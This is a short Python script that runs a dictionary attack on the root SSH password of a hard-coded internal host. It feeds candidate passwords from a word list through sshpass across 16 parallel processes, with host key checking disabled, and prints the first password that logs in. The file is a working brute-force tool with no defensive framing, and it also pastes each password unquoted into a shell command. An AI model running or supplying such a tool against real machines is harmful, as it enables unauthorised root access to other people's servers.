#!/usr/bin/env python
import os
import sys

import multiprocessing
import subprocess
import datetime,time
import re

# Define
def checker(ip,host,event):
#
    pw = ip
#
    #cmd = "timeout 2 sshpass -p " + pw + " ssh -q root@" + host + "  -o StrictHostKeyChecking=no 'exit';"
    cmd = "sshpass -p " + pw + " ssh -q root@" + host + "  -o StrictHostKeyChecking=no 'exit';"
    p = subprocess.Popen(cmd,shell=True,stdout=subprocess.PIPE)
    output, error = p.communicate()
    executetime=output.split('\n')

#    
    if p.returncode:
        print("."),

    elif p.returncode == 0:
        print("")
        print(pw)
        event.set()      
        #sys.exit()
        #os._exit(1)
        #thread.exit(1)


# main block
if __name__ == '__main__':

    #
    host = "10.8.60.82"
    f = open('dictionary.txt')
    iplist = f.read().split()


    #Pool size define
    p= multiprocessing.Pool(16) 
    m = multiprocessing.Manager()
    event = m.Event()
    for ip in iplist:
        p.apply_async(checker, (ip,host,event))
    p.close()

    event.wait()  # We'll block here until a worker calls `event.set()`
    p.terminate() # Terminate all processes in the Pool




            
